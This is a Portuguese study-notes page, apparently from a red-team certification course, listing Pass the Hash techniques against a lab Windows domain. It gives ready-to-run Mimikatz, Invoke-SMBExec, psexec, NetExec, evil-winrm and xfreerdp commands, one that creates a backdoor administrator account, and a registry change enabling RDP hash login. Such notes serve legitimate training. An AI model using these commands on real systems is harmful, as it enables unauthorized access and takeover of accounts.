> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/pass-the-hash-pth.md).

# Pass the Hash (PtH)

* Um ataque [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) é uma técnica na qual um atacante usa um hash de senha em vez da senha em texto simples para autenticação.

**Pass the Hash from Windows Using Mimikatz**

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

* Podemos tentar nos conectar a uma pasta compartilhada chamada `julio` no controlador de domínio.

```
dir \\dc01\julio
```

**Invoke-TheHash com SMB**

* O comando a seguir utilizará o método SMB para execução de comandos, criando um novo usuário chamado mark e adicionando-o ao grupo Administradores.

{% code lineNumbers="true" %}

```powershell
cd C:\tools\Invoke-TheHash\
powershell -ep bypass
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

{% endcode %}

* **Pass the Hash with Impacket PsExec**

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

* **Pass the Hash with NetExec**

```
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

* **NetExec - Execução de Comandos**

```
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

* **Pass the Hash with evil-winrm (Linux)**

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**Pass the Hash with RDP (Linux)**

* **Ative o Modo de Administrador Restrito para permitir o PtH.**

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

* Após adicionar a chave de registro, podemos usá-la `xfreerdp`com a opção `/pth`para obter acesso RDP:

```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
